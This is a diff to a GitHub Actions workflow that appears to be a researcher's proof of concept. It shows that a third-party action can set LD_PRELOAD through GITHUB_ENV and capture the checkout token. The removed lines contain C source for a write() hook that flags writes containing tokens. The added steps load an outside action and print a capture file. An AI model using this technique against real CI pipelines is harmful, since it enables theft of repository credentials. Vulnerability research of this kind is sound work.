@@ -6,56 +6,32 @@ permissions:
   contents: read
 
 jobs:
-  test:
+  cross-boundary-test:
     runs-on: ubuntu-latest
     steps:
-      - name: compile write-hook .so and set LD_PRELOAD
-        run: |
-          cat > /tmp/hook.c << 'CEOF'
-          #define _GNU_SOURCE
-          #include <dlfcn.h>
-          #include <unistd.h>
-          #include <string.h>
-          #include <fcntl.h>
-          
-          static ssize_t (*real_write)(int, const void*, size_t) = NULL;
-          
-          ssize_t write(int fd, const void *buf, size_t count) {
-              if (!real_write) real_write = dlsym(RTLD_NEXT, "write");
-              
-              // Capture writes that contain token-like strings
-              if (count > 10 && count < 8192) {
-                  const char *s = (const char*)buf;
-                  if (memmem(s, count, "password", 8) ||
-                      memmem(s, count, "x-access-token", 14)) {
-                      int capfd = open("/tmp/write_captures.txt",
-                          O_WRONLY|O_CREAT|O_APPEND, 0600);
-                      if (capfd >= 0) {
-                          // Write key=value length only (not actual content)
-                          char line[256];
-                          int len = snprintf(line, sizeof(line),
-                              "WRITE fd=%d len=%zu contains_token=yes\n", fd, count);
-                          real_write(capfd, line, len);
-                          close(capfd);
-                      }
-                  }
-              }
-              return real_write(fd, buf, count);
-          }
-          CEOF
-          gcc -shared -fPIC -o /tmp/hook.so /tmp/hook.c -ldl
-          echo "LD_PRELOAD=/tmp/hook.so" >> $GITHUB_ENV
+      - name: Step 1 — Use third-party action (toofikz2)
+        uses: toofikz2/public-test-repo@main
 
-      - name: checkout (git uses credential helper with token)
+      - name: Step 2 — Standard checkout (trust boundary crossing)
         uses: actions/checkout@v4
 
-      - name: check captures
+      - name: Step 3 — Check if cross-boundary capture succeeded
         run: |
-          echo "=== Write hook captures ==="
-          if [ -f /tmp/write_captures.txt ]; then
-            cat /tmp/write_captures.txt
+          echo "=== CROSS-BOUNDARY LD_PRELOAD TEST ==="
+          echo "This workflow uses toofikz2/public-test-repo@main (a third-party action)"
+          echo "which sets LD_PRELOAD via GITHUB_ENV. The .so captures INPUT_TOKEN"
+          echo "from actions/checkout's process environment."
+          echo ""
+          echo "LD_PRELOAD value: $LD_PRELOAD"
+          echo ""
+          if [ -f /tmp/crossboundary_capture.txt ]; then
+            echo "CROSS-BOUNDARY CAPTURE SUCCEEDED:"
+            cat /tmp/crossboundary_capture.txt
             echo ""
-            echo "Lines captured: $(wc -l < /tmp/write_captures.txt)"
+            echo "FINDING: Third-party action (toofikz2) captured tokens from"
+            echo "checkout step running in workflow owner's (toofikz4) context."
+            echo "This proves the GITHUB_ENV blocklist gap enables cross-trust-boundary"
+            echo "credential capture via LD_PRELOAD."
           else
-            echo "No captures"
+            echo "No capture file found"
           fi
